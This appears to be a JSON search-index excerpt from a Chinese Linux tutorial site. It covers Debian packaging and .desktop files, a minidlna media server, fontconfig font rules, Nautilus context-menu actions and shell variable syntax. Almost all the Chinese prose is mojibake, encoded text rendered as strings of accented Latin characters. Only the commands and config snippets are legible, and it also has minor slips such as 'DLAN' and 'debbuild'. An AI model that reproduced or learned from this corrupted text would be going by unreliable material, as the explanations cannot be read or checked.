åœ¨DebåŒ…æ–‡ä»¶è§£åŒ…ä¹‹å‰ï¼ˆå³è½¯ä»¶å®‰è£…å‰ï¼‰ï¼Œå°†ä¼šè¿è¡Œè¯¥è„šæœ¬ã€‚å¯ä»¥åœæ­¢ä½œç”¨äºå¾…å‡çº§è½¯ä»¶åŒ…çš„æœåŠ¡ï¼Œç›´åˆ°è½¯ä»¶åŒ…å®‰è£…æˆ–å‡çº§å®Œæˆã€‚ preinstæ–‡ä»¶ è´Ÿè´£å®Œæˆå®‰è£…åŒ…æ—¶çš„é…ç½®å·¥ä½œã€‚å¦‚æ–°å®‰è£…æˆ–å‡çº§çš„è½¯ä»¶é‡å¯æœåŠ¡ã€‚è½¯ä»¶å®‰è£…å®Œåï¼Œæ‰§è¡Œè¯¥Shellè„šæœ¬ï¼Œä¸€èˆ¬ç”¨æ¥é…ç½®è½¯ä»¶æ‰§è¡Œç¯å¢ƒï¼Œå¿…é¡»ä»¥\"#!/bin/sh\"ä¸ºé¦–è¡Œã€‚ prermæ–‡ä»¶ è¯¥è„šæœ¬è´Ÿè´£åœæ­¢ä¸è½¯ä»¶åŒ…ç›¸å…³è”çš„daemonæœåŠ¡ã€‚å®ƒåœ¨åˆ é™¤è½¯ä»¶åŒ…å…³è”æ–‡ä»¶ä¹‹å‰æ‰§è¡Œ postrmæ–‡ä»¶ è´Ÿè´£ä¿®æ”¹è½¯ä»¶åŒ…é“¾æ¥æˆ–æ–‡ä»¶å…³è”ï¼Œæˆ–åˆ é™¤ç”±å®ƒåˆ›å»ºçš„æ–‡ä»¶ã€‚è½¯ä»¶å¸è½½åï¼Œæ‰§è¡Œè¯¥Shellè„šæœ¬ï¼Œä¸€èˆ¬ä½œä¸ºæ¸…ç†æ”¶å°¾å·¥ä½œï¼Œå¿…é¡»ä»¥\"#!/bin/sh\"ä¸ºé¦–è¡Œ copyrightæ–‡ä»¶ changlogæ–‡ä»¶ conffilesæ–‡ä»¶ ç”¨ä¾‹ å¤§æ¦‚ç›®å½•ç»“æ„: .dist/deb_ev-deb/ |-- DEBIAN | `-- control | `-- postinit `-- usr |-- local | `-- life | `-- ev-deb-1.0.1 | `-- main.bin `-- share |-- applications | `-- life | `-- ev-deb.desktop `-- icons `-- life `-- ic.png å…¶ä¸­: DEBIAN/control æ˜¯åŒ…ç›¸å…³ä¿¡æ¯, å¿…æœ‰. é…ç½®å†…å®¹å¤§æ¦‚: Package: ev-deb Version: 1.0.1 Architecture: amd64 Maintainer: yq Description: desc a every deb DEBIAN/control è¿™é‡Œç”¨æ¥åšæ¡Œé¢å›¾æ ‡è®¾ç½®ç›¸å…³è„šæœ¬, æœ‰GUIç•Œé¢æ‰éœ€è¦è®¾ç½® å†…å®¹: #!/bin/bash cp /usr/share/applications/life/ev-deb.desktop ~/Desktop å…¶ä»–çš„æ¯”å¦‚ usr æ˜¯æ¨¡ä»¿linuxç³»ç»Ÿç»“æ„æ¥è¿›è¡Œå¸ƒå±€, æ¯”å¦‚è¿™é‡Œçš„æ˜¯ usr/local/life/ev-deb-1.0.1 , é‚£ä¹ˆå®é™…çš„å®‰è£…ä½ç½®å°±æ˜¯ /usr/local/life/ev-deb-1.0.1 . usr/share/applications/life/ev-deb.desktop , ä¸»è¦æ˜¯éœ€è¦åœ¨ /usr/share/applications åˆ›å»ºä¸€ä¸ª .desktop æ–‡ä»¶, ä»¥ä¾¿äºåœ¨ GUI ç•Œé¢çš„æ—¶å€™å¯ä»¥åœ¨æ¡Œé¢æ´»ç€ä»»åŠ¡æ çœ‹åˆ°, è‹¥æ˜¯GUIåº”ç”¨å¿…æœ‰. é…ç½®å†…å®¹å¤§æ¦‚: [Desktop Entry] Name=ev-deb Comment=desc a every deb Exec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin Icon=.dist/deb_ev-deb/usr/share/icons/life/ic.png Terminal=true Type=Application X-Ubuntu-Touch=true Categories=Development ä¸”å¿…æœ‰å¯æ‰§è¡Œæƒé™. Name è¡¨ç¤ºåœ¨æ¡Œé¢ä¸Šæ˜¾ç¤ºçš„åç§° usr/share/icons , å›¾æ ‡ä½ç½®, GUIç•Œé¢å¿…æœ‰, ç”¨äº .desktop æ–‡ä»¶. ç‰¹åˆ«è¯´æ˜, Execå­—æ®µæŒ‡å®šçš„è·¯å¾„å¦‚æœæœ‰ç©ºæ ¼, å¯ä»¥ç”¨å¼•å·ä»£æ›¿ Iconå­—æ®µæŒ‡å®šçš„å›¾æ ‡è·¯å¾„ä¸èƒ½æœ‰å¼•å·ä¸ç©ºæ ¼, å¦åˆ™ dpkg -b æ‰“åŒ…çš„æ—¶å€™æ ¡éªŒä¸é€šè¿‡(ä½†æ˜¯å®é™…å®‰è£…å¥½åå¯ä»¥ç”¨ç©ºæ ¼, ä¸èƒ½ç”¨å¼•å·). æ³¨è§£ usr/share/applications/ ä¸‹æ˜¯ç³»ç»Ÿçš„å¯åŠ¨å™¨é»˜è®¤çš„åº”ç”¨(æ¡Œé¢æ–‡ä»¶)å­˜æ”¾ä½ç½®, è‹¥æ”¾åœ¨å…¶ä»–ä½ç½®å¦‚ ~/.local/share/applications/ , å¯ä½¿ç”¨æŒ‡ä»¤æ›´æ–°: update-desktop-database ~/.local/share/applications/ è¿™æ ·å°±ä¸éœ€è¦æ‰‹åŠ¨ å³é”® - å…è®¸å¯åŠ¨ äº† å®˜æ–¹æ–‡æ¡£å»ºè®®çš„æ‰“åŒ…å·¥å…· debmake: debç›®å½•ç»“æ„ç”Ÿæˆå·¥å…· (å¥½åƒéœ€è¦æ‰‹åŠ¨è£…) debbuild: æ ¹æ®ä¸Šä¸€æ­¥æ„å»ºå¥½çš„ç»“æ„, ç”ŸæˆåŒ…, ä¸ dpkg -b ç±»ä¼¼, ä¸è¿‡ dpkg æ›´åº•å±‚. debbuild è¯»å–è½¯ä»¶åŒ…çš„æºä»£ç ç›®å½•ä¸­çš„ debian/rules` æ–‡ä»¶æ¥æ‰§è¡Œæ„å»ºè¿‡ç¨‹ï¼Œ å¹¶è‡ªåŠ¨å¤„ç†æ„å»ºè¿‡ç¨‹ä¸­çš„è®¸å¤šæ­¥éª¤ï¼Œä¾‹å¦‚é…ç½®ã€ç¼–è¯‘å’Œå®‰è£…. debuild è¿˜ä¼šæ£€æŸ¥æ„å»ºä¾èµ–å…³ç³»å¹¶ç¡®ä¿å®ƒä»¬å·²æ»¡è¶³ï¼Œä»¥åŠç”Ÿæˆç¬¦åˆ Debian è½¯ä»¶åŒ…è§„èŒƒçš„äºŒè¿›åˆ¶å’Œæºä»£ç è½¯ä»¶åŒ…. dpkg -b æ˜¯ä¸€ä¸ªæ›´åº•å±‚çš„å·¥å…·ï¼Œç”¨äºå°†å·²ç»æ„å»ºå¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ª Debian æ ¼å¼çš„è½¯ä»¶åŒ…. å®ƒä¸ä¼šè‡ªåŠ¨æ‰§è¡Œæ„å»ºè¿‡ç¨‹ï¼Œè€Œæ˜¯éœ€è¦æ‰‹åŠ¨æä¾›å·²ç»æ„å»ºå¥½çš„æ–‡ä»¶å’Œå¿…è¦çš„æ§åˆ¶ä¿¡æ¯ï¼ˆä¾‹å¦‚åŒ…åã€ç‰ˆæœ¬å·ã€ä¾èµ–å…³ç³»ç­‰ï¼‰. dpkg -b çš„ä¼˜ç‚¹æ˜¯çµæ´»æ€§ï¼Œå…è®¸ç”¨æˆ·æ‰‹åŠ¨æ§åˆ¶è½¯ä»¶åŒ…çš„æ„å»ºæµç¨‹å’Œç»†èŠ‚. debåŒ…é…ç½®å³é”®å•å‡»æ”¯æŒä½¿ç”¨å…¶ä»–åº”ç”¨æ‰“å¼€ åªéœ€é…ç½® desktop æ–‡ä»¶, å¦‚ä¸Šé¢çš„ usr/share/applications/life/ev-deb.desktop è¿˜æ˜¯ç”¨ä¸Šé¢çš„ä¾‹å­: [Desktop Entry] Name=ev-deb Comment=desc a every deb Exec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin Icon=.dist/deb_ev-deb/usr/share/icons/life/ic.png Terminal=true Type=Application X-Ubuntu-Touch=true Categories=Development æœ‰ä¸¤ä¸ªåœ°æ–¹è¦æ”¹, ä¸€ä¸ªæ˜¯Execæ”¹ä¸ºéœ€è¦å¢åŠ å‚æ•° Exec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin %F éƒ¨åˆ†æ”¯æŒçš„å‚æ•°: %F: é€‰ä¸­æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶çš„è·¯å¾„ %U: é€‰ä¸­æ–‡ä»¶å¤¹çš„è·¯å¾„ å¦ä¸€ä¸ªæ˜¯å¢åŠ  `MimeType` , ä¸ controlæ–‡ä»¶ çš„ MimeType ä¸€è‡´, éœ€è¦è¯´æ˜çš„æ˜¯, å³ä½¿å·²ç»åœ¨ controlæ–‡ä»¶ å†™äº† MimeType , è¿˜æ˜¯å¾—åœ¨ desktop æ–‡ä»¶å†å†™ä¸€æ¬¡(å¤šä¸ªç”¨åˆ†å·éš”å¼€), ä¸¤ä¸ªåœ°æ–¹çš„ä¸å…±äº«. è¡¨ç¤ºå“ªäº›ç±»å‹çš„æ–‡ä»¶å¯ä»¥å³é”®é€‰æ‹©ç”¨æ­¤åº”ç”¨æ‰“å¼€. æ¯”å¦‚: MimeType=text/plain;inode/directory;application/x-code-workspace;","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Build-a-local-bucket.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Build-a-local-bucket.html"},{"title":"Linuxä¸‹é…ç½®DLANæœåŠ¡","text":"DLANæ˜¯ä¸€ä¸ªé€‚ç”¨äºå¤šåª’ä½“çš„ä¼ è¾“åè®® å®‰è£… minidlna: sudo apt-get install -y minidlna ç¼–è¾‘ minidlna çš„é…ç½®æ–‡ä»¶ /etc/minidlna.conf media_dir=/path/to/media db_dir=/var/lib/minidlna log_dir=/var/log/minidlna friendly_name=DLNA Server port=8200 å…¶ä¸­ media_dir æ˜¯æ‚¨åª’ä½“æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªç›®å½•ï¼› friendly_name æ˜¯æœåŠ¡å™¨åç§°ï¼› port æ˜¯æœåŠ¡ç›‘å¬çš„ç«¯å£å·ã€‚ å¯åŠ¨ minidlna æœåŠ¡: sudo service minidlna start æ·»åŠ å…±äº«æ–‡ä»¶å¤¹: sudo minidlna -R æ­¤å‘½ä»¤å°†é‡æ–°æ‰«æ media_dir ä¸­çš„åª’ä½“æ–‡ä»¶ï¼Œå¹¶æ·»åŠ åˆ° DLNA æœåŠ¡å™¨ä¸­ã€‚ æµ‹è¯• DLNA æœåŠ¡å™¨æ˜¯å¦æ­£å¸¸å·¥ä½œï¼š ä½¿ç”¨æ”¯æŒ DLNA åè®®çš„è®¾å¤‡æˆ–è½¯ä»¶ï¼Œ ä¾‹å¦‚ VLC æ’­æ”¾å™¨ã€Windows Media Player ç­‰ï¼Œè¿æ¥åˆ° DLNA æœåŠ¡å™¨çš„ IP åœ°å€å’Œç«¯å£å·å³å¯è®¿é—®ã€‚ å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™åº”è¯¥å¯ä»¥æµè§ˆã€æœç´¢å’Œæ’­æ”¾åª’ä½“æ–‡ä»¶äº†ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Configure-the-DLAN-service-under-Linux.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Configure-the-DLAN-service-under-Linux.html"},{"title":"debian/ubuntuå­—ä½“è¯´æ˜","text":"Ubuntuå­—ä½“åŠé…ç½®è¯´æ˜: https://wiki.ubuntu.org.cn/å­—ä½“#.E9.85.8D.E7.BD.AE.fonts.conf å‚è€ƒ: https://catcat.cc/post/2020-10-31/ Linux æ¡Œé¢ç¨‹åºä½¿ç”¨å­—ä½“çš„æ–¹å¼ï¼Œå— fontconfig çš„å½±å“å’Œæ§åˆ¶ã€‚ ä¸€ä¸ªå­—ä½“æ–‡ä»¶ï¼Œå¯ä»¥æä¾›å¤šä¸ªå­—ä½“æ—å (family)ã€‚ æ¯”å¦‚ Arch Linux ç”¨æˆ·åœ¨ å®‰è£… wqy-microhei åï¼Œ ç³»ç»Ÿç«¯å¢åŠ äº† wqy-microhei.ttc è¿™ä¸ª å­—ä½“æ–‡ä»¶ï¼Œ åˆ†åˆ«æä¾›ã€ŒWenQuanYi Micro Heiã€ã€Œæ–‡æ³‰é©›å¾®ç±³é»‘ã€,ã€Œæ–‡æ³‰é©¿å¾®ç±³é»‘ã€ ä¸‰ä¸ªå­—ä½“æ—åï¼Œ å®ƒä»¬æ˜¯ä¸€ä¸ªæ„æ€ã€‚å¯ä»¥è¿è¡Œ fontconfig æä¾›çš„å‘½ä»¤è¡Œå·¥å…· fc-list å»æŸ¥çœ‹ç³»ç»Ÿä¸Š å·²å®‰è£…çš„å­—ä½“å·²ç»å®ƒä»¬å¯¹åº”çš„å­—ä½“æ—åã€‚ è‡³äº sans-serifï¼Œserifï¼Œmonospaceï¼Œåˆ™æ˜¯ä¸‰ä¸ªé€šç”¨å­—ä½“æ—å (generic family)ï¼Œ å®ƒä»¬ä¸æ˜¯çœŸå®å­˜åœ¨çš„å­—ä½“ï¼Œè€Œæ˜¯åˆ†åˆ«æŒ‡ç¤ºç¨‹åºå»ä½¿ç”¨æ— è¡¬çº¿ã€è¡¬çº¿ã€ç­‰å®½å­—ä½“ã€‚ é‚£ä¹ˆæ¡Œé¢ç¨‹åºåˆæ˜¯å¦‚ä½•çŸ¥é“å…·ä½“ä½¿ç”¨å“ªäº›å­—ä½“å‘¢ï¼Ÿ å®ƒåªéœ€è¦å»æŸ¥è¯¢ fontconfig å°±è¡Œäº†ã€‚ ç”±äºå®ƒä»¬å¿…å®šè¦ç»è¿‡ fontconfig çš„æŸ¥è¯¢æµç¨‹åæ‰èƒ½ä½¿ç”¨å­—ä½“ï¼Œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ fontconfig çš„é…ç½®å»ç²¾å‡†æ§åˆ¶ç¨‹åºä½¿ç”¨çš„å­—ä½“ã€‚ é…ç½®æ–‡ä»¶æµå‘ fontconfig ä¸»è¦è¯»å– /etc/fonts/fonts.conf /etc/fonts/conf.d/*.conf ~/.config/fontconfig/fonts.conf ~/config/fontconfig/conf.d/*.conf è‡³äºé‚£äº›å†å²é—ç•™çš„ç›®å½•ä½ç½® ~/.fonts.conf.d/*.conf å’Œ ~/.fonts.conf ï¼Œ ç”±äºä¸éµå®ˆ XDG è§„èŒƒï¼Œæˆ‘ä»¬å°±ä¸è¦å†ä½¿ç”¨å®ƒä»¬äº†ã€‚ fontconfig å¹¶éå›ºå®šè¯»å–è¿™äº›ä½ç½®ï¼Œå®ƒé¦–å…ˆè¯»å– /etc/fonts/fonts.confï¼Œè¯¥æ–‡ä»¶ä¸­æœ‰å¥: <include ignore_missing=\"yes\">conf.d</include> è¡¨ç¤ºå°† /etc/fonts/conf.d/ ç›®å½•ä¸­çš„æ–‡ä»¶çº³å…¥è¯»å–ä¸­, åœ¨è¿™ä¸ªç›®å½•ä¸­çš„é…ç½®æ–‡ä»¶ï¼ŒæŒ‰ç…§æ–‡ä»¶åå‰çš„æ•°å­—çš„é¡ºåºè¿›è¡Œè¯»å–ã€‚ è€Œå½“è¯»å–åˆ°50-user.confçš„æ—¶å€™ï¼Œå…¶ä¸­çš„è¯­å¥: <include ignore_missing=\"yes\" prefix=\"xdg\">fontconfig/conf.d</include> <include ignore_missing=\"yes\" prefix=\"xdg\">fontconfig/fonts.conf</include> <include ignore_missing=\"yes\" deprecated=\"yes\">~/.fonts.conf.d</include> <include ignore_missing=\"yes\" deprecated=\"yes\">~/.fonts.conf</include> æŒ‡ç¤º fontconfig å¼€å§‹è¯»å–ç”¨æˆ·å®¶ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶ã€‚ è¯­å¥ä¸­çš„å±æ€§å€¼prefix=\"xdg\"ï¼Œä»£è¡¨ XDG_CONFIG_HOME ç›®å½•ï¼Œ é»˜è®¤æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„~/.config/ç›®å½•ã€‚ å­—ä½“æ–‡ä»¶ä½ç½® fontconfig çš„å¾ˆå¤šé…ç½®æ–‡ä»¶æ˜¯å…ˆä»/etc/fonts/fonts.confå¼•å…¥çš„ã€‚ å…¶å®ï¼Œfontconfig è·å–å­—ä½“æ–‡ä»¶çš„ä½ç½®ï¼Œä¹Ÿæ˜¯è¯¥æ–‡ä»¶å®šä¹‰çš„ã€‚ ä½ ä¼šå‘ç° è¯¥æ–‡ä»¶çš„å¼€å¤´å°±åœ¨æŒ‡å®šå­—ä½“ç›®å½•: <dir>/usr/share/fonts</dir> <dir>/usr/local/share/fonts</dir> <dir prefix=\"xdg\">fonts</dir> <!-- the following element will be removed in the future --> <dir>~/.fonts</dir> å½“æˆ‘ä»¬å®‰è£…å­—ä½“è½¯ä»¶åŒ…æ—¶ï¼Œè½¯ä»¶åŒ…æŠŠå­—ä½“æ–‡ä»¶æ”¾åœ¨äº†/usr/share/fonts/ç›®å½•ä¸‹ é…ç½®è‡ªå·±çš„è§„åˆ™ æ¯”å¦‚æˆ‘å·²ç»æå‰å®‰è£…å¥½äº† inconsolata å­—ä½“, ç„¶ååœ¨å®¶ç›®å½•ä¸‹è®¾ç½®äº†é…ç½®æ–‡ä»¶, æ–°å»ºæ–‡ä»¶ ~/.config/fontconfig/fonts.conf : <?xml version=\"1.0\"?> <!DOCTYPE fontconfig SYSTEM \"/etc/fonts/conf.d/fonts.dtd\"> <fontconfig> <match target=\"pattern\"> <test qual=\"any\" name=\"family\"> <string>monospace</string> </test> <edit name=\"family\" mode=\"prepend\" binding=\"strong\"> <string>inconsolata</string> <string>Iosevka Custom</string> <string>Noto Sans Mono CJK SC</string> <string>Blobmoji</string> <string>Symbols Nerd Font</string> </edit> </match> </fontconfig> è¿™ä¸ªæ—¶å€™æŸ¥è¯¢ç­‰å®½å­—ä½“çš„ç»“æœå°±æ˜¯æˆ‘è®¾ç½®çš„è¿™ä¸ª: $ fc-match \"monospace\" Inconsolata.otf: \"Inconsolata\" \"Medium\" è§£é‡Šä¸€ä¸‹è¿™é‡Œé…ç½®å«ä¹‰ fontconfig è¡¨ç¤ºæ˜¯ä¸€ä¸ªå­—ä½“æŸ¥è¯¢é…ç½® match åŒ¹é…è§„åˆ™, <match target=\"pattern\"> ï¼Œè¢«æ“ä½œå¯¹è±¡æ˜¯ font pattern; å¦‚æœæ˜¯ <match target=\"font\"> , åˆ™æ˜¯å¯¹å•ä¸ªå­—ä½“çš„æ“ä½œ test å®šä¹‰åŒ¹é…è§„åˆ™, å¯é€‰çš„æµ‹è¯•æ¡ä»¶ã€‚åªæœ‰å½“æ»¡è¶³æµ‹è¯•æ¡ä»¶çš„æ—¶å€™ï¼Œæ‰æ‰§è¡Œ<edit>; è¿™é‡Œè¡¨ç¤ºåŒ¹é… monospace å®¶æ— edit è¡¨ç¤ºåŒ¹é…çš„å­—ä½“ç»“æœ æ­¤å¤„å®Œæ•´å«ä¹‰: åœ¨è¿™é‡Œï¼Œtest è¯­å¥é’ˆå¯¹äº† font pattern ä¸­çš„ monospaceã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œ æ¥ä¸‹æ¥çš„ edit è¯­å¥å°±åœ¨ font pattern çš„ monospace è¿™ä¸ªä½ç½®ä¸Šè¿›è¡Œæ“ä½œã€‚ mode=\"prepend\"çš„æ„æ€æ˜¯åœ¨ monospace å‰æ·»åŠ å››ä¸ªå­—ä½“ï¼š ç­‰å®½å­—ä½“ inconsolataï¼Œ è‹±æ–‡ç­‰å®½å­—ä½“ Iosevka Customï¼Œ ä¸­æ–‡å­—ä½“ Noto Sans Mono CJK SCï¼Œ ä»¥åŠé€šç”¨å­—ä½“æ—å emojiã€‚ binding=\"strong\"ï¼Œæ˜¯å¼ºç»‘å®šçš„æ„æ€ï¼Œ å®ƒä¼šå½±å“ font pattern çš„æ’åºç»“æœï¼Œ name=\"family\" è¡¨æ˜è¢«æ“ä½œå¯¹è±¡æ˜¯æ˜¯ font pattern ä¸­çš„ familyã€‚ mode=\"prepend\" è¡¨ç¤ºåœ¨ç»“æœä¹‹å‰æ’å…¥; å¦‚æœæ˜¯ mode=\"assign\" , è¡¨ç¤ºå¯¹testä¸­çš„Stringä¿®æ”¹æ›¿æ¢. å¦‚å‘ fc-match ä¼ å…¥çš„ font pattern æ˜¯å¯ä»¥æœ‰å¤šä¸ªå­—ä½“çš„ã€‚ ç°åœ¨æˆ‘ä»¬è¦è¿è¡Œ: FC_DEBUG=4 fc-match 'cantarell, WenQuanYi Micro Hei' ç»è¿‡è¿™æ®µé…ç½®ä¼šå˜æˆä»€ä¹ˆå‘¢: <match target=\"pattern\"> <test name=\"family\"> <string>Cantarell</string> </test> <edit name=\"family\" mode=\"assign\" binding=\"strong\"> <string>Noto Sans</string> </edit> </match> è¿™é‡Œçš„mode=\"assign\"ï¼Œè¡¨ç¤º å°† font pattern ä¸­çš„ Cantarell ä¿®æ”¹æˆ Noto Sansã€‚ æ²¡æœ‰å¯¹ WenQuanYi Micro Hei çš„æ“ä½œï¼Œæ‰€ä»¥ç»“æœæ˜¯: family: \"Noto Sans\"(s) \"WenQuanYi Micro Hei\"(s) binding=\"strong\" è¡¨ç¤ºå¼ºç»‘å®š ä¸‹é¢çš„ String çš„å†…å®¹çš„æ˜¯ç»“æœåˆ—è¡¨, æ”¯æŒå¤šä¸ª å…ˆåé¡ºåºå°±æ˜¯è®¾ç½®çš„ä¼˜å…ˆä½¿ç”¨çš„å­—ä½“é¡ºåºã€‚ æœ€å…ˆå°è¯•ä½¿ç”¨ inconsolata å­—ä½“ä½œä¸ºè‹±æ–‡ç­‰å®½å­—ä½“, ç„¶åæ‰æ˜¯ Iosevka ï¼Œ ä¸­æ—¥éŸ©å­—ä½“ä½¿ç”¨ Noto Sans Mono CJK SC ï¼Œ å‰©ä¸‹çš„ emoji å’Œç‰¹æ®Šç¬¦å· ä¼˜å…ˆä½¿ç”¨ Blobmoji å’Œ Nerd font ã€‚ å®Œæ•´å±æ€§è¯´æ˜å¯å‚è€ƒ: https://www.cnblogs.com/jacker1979/p/4695169.html æ³¨è§£ æ—§ç‰ˆæ˜¯ä½¿ç”¨çš„alias: <match>...<test>...<edit name=\"family\" mode=\"prepend\">... ç­‰ä»·äº <alias>...<family>...<prefer>...","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Debian-Ubuntu-font-description.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Debian-Ubuntu-font-description.html"},{"title":"GNOMEæ–‡ä»¶ç®¡ç†å™¨å†…æ·»åŠ å³é”®èœå•","text":"ç›®å‰å·²æµ‹è¯•é€‚ç”¨ä¸ Ubuntu20 nautilus nautilus æ˜¯ GNOME è‡ªå¸¦çš„æ–‡ä»¶ç®¡ç†å™¨, å¯ä»¥ç†è§£ä¸ºWinçš„æ–‡ä»¶ç®¡ç†å™¨ ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ .local/share/nautilus/scripts åªèƒ½åœ¨å³é”®å•å‡»æ–‡ä»¶æ—¶å€™å¼¹å‡ºæ‰€æ·»åŠ çš„è„šæœ¬ ç›®å‰ç»è¿‡å¤šæ–¹æœç´¢, æš‚æ—¶åªç¡®å®šäº†ä½¿ç”¨é¢å¤–çš„åŒ… nautilus-actions è¾…åŠ©è§£å†³, æ–°ç‰ˆæœ¬æ˜¯ filemanager-actions . å…¶å®æ ¸å¿ƒéƒ½æ˜¯ä¸€æ ·çš„, å°±æ˜¯ nautilus åœ¨ æ–°ç‰ˆæ›´åä¸º filemanager . æ—§ç‰ˆæœ¬å®‰è£…: apt install nautilus-actions æ–°ç‰ˆæœ¬å®‰è£…: apt install filemanager-actions å®‰è£…åå¸¦å¼€å›¾å½¢ç•Œé¢è¿›è¡Œå³é”®èœå•çš„ç¼–è¾‘, é€‰æ‹©æ–°å»ºèœå•/æ–°å»ºåŠ¨ä½œå³å¯, æ³¨æ„é»˜è®¤æ˜¯æœ‰ä¸€ä¸ª filemanager çš„æ ¹èœå•, å¦‚æœä¸æƒ³è¦, åœ¨ ç¼–è¾‘-é¦–é€‰é¡¹-è¿è¡Œæ—¶é¦–é€‰é¡¹-Nautilsèœå•å¸ƒå±€ ä¸‹å–æ¶ˆå‹¾é€‰å³å¯. æ–°ç‰ˆ filemanager çš„é…ç½®æ–‡ä»¶åœ¨ ~/.config/filemanager-actions ä¸‹é¢, è€Œè‡ªå®šä¹‰çš„é…ç½®çš„æ–‡ä»¶ä½ç½®åœ¨ ~/.local/share/nautilus/file-manager/actions ä¸‹. ~/.local/share/nautilus/file-manager/actions ä¸‹è¿˜æ˜¯ .desktop æ–‡ä»¶, ä¾‹: [Desktop Entry] Type=Action Name=èœå•é¡¹åç§° Icon=/path/to/your/icon.png Exec=/path/to/your/command \"%F\" Name[en_US]=èœå•é¡¹åç§° [Desktop Action èœå•é¡¹åç§°] Name=å­èœå•é¡¹åç§° Exec=/path/to/your/command \"%F\" Icon=/path/to/your/icon.png","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Right--click-menu-to-the-gnome-file-manager.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Right--click-menu-to-the-gnome-file-manager.html"},{"title":"Linuxå„ç§$(ç¾å…ƒç¬¦)","text":"$$ Shellæœ¬èº«çš„PIDï¼ˆProcessIDï¼Œå³è„šæœ¬è¿è¡Œçš„å½“å‰ è¿›ç¨‹IDå·ï¼‰ $! Shellæœ€åè¿è¡Œçš„åå°Processçš„PID(åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„ è¿›ç¨‹IDå·) $? æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ï¼ˆè¿”å›å€¼ï¼‰å³æ‰§è¡Œä¸Šä¸€ä¸ªæŒ‡ä»¤çš„è¿”å›å€¼ (å³æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯) $- æ˜¾ç¤ºshellä½¿ç”¨çš„å½“å‰é€‰é¡¹ï¼Œä¸setå‘½ä»¤åŠŸèƒ½ç›¸åŒ $* æ‰€æœ‰å‚æ•°åˆ—è¡¨ã€‚å¦‚ \"$*\" ç”¨ã€Œ\"ã€æ‹¬èµ·æ¥çš„æƒ…å†µ, è¡¨ç¤ºä»¥ $1 $2 â€¦ $n çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ï¼Œæ­¤é€‰é¡¹å‚æ•°å¯è¶…è¿‡9ä¸ªã€‚ $@ æ‰€æœ‰å‚æ•°åˆ—è¡¨ã€‚å¦‚ \"$@\" ç”¨ã€Œ\"ã€æ‹¬èµ·æ¥çš„æƒ…å†µ, è¡¨ç¤ºä»¥ \"$1\" \"$2\" â€¦ \"$n\" çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚ $@ è·Ÿ $* ç±»ä¼¼ï¼Œä½†æ˜¯å¯ä»¥å½“ä½œæ•°ç»„ç”¨ $# æ·»åŠ åˆ°Shellçš„å‚æ•°ä¸ªæ•° $0 Shellæœ¬èº«çš„æ–‡ä»¶å $1~$n æ·»åŠ åˆ°Shellçš„å„å‚æ•°å€¼. $1 æ˜¯ç¬¬1å‚æ•°, $2 æ˜¯ç¬¬2å‚æ•°â€¦ã€‚ !$ æœ€åæ‰§è¡Œçš„è¯­å¥ä»¥åŠç»“æœ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Linux-various-$.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Linux-various-$.html"},{"title":"é€»è¾‘ä¸","text":"å³ && , ä¸»è¦è¯´ä¸€ä¸‹ä¸ & ä¸€èµ·ä½¿ç”¨çš„æƒ…å†µ å¦‚: cmd1 && cmd2 && cmd3 & é»˜è®¤è¡¨ç¤º cmd1 && cmd2 && cmd3 éƒ½åœ¨åå°æ‰§è¡Œ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Logic-and.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Logic-and.html"},{"title":"shellçš„å˜é‡æ›¿æ¢","text":"å‡ ç§ç‰¹æ®Šçš„æ›¿æ¢ç»“æ„ å››ç§: ${var:-string} ${var:+string} ${var:=string} ${var:?string} ${var:-string} å’Œ ${var:=string} : è‹¥å˜é‡varä¸ºç©ºï¼Œåˆ™ç”¨åœ¨å‘½ä»¤è¡Œä¸­ç”¨stringæ¥æ›¿æ¢${var:-string}ï¼Œ å¦åˆ™å˜é‡varä¸ä¸ºç©ºæ—¶ï¼Œåˆ™ç”¨å˜é‡varçš„å€¼æ¥æ›¿æ¢${var:-string}ï¼› å¯¹äº${var:=string}çš„æ›¿æ¢è§„åˆ™å’Œ${var:-string}æ˜¯ä¸€æ ·çš„ï¼Œ 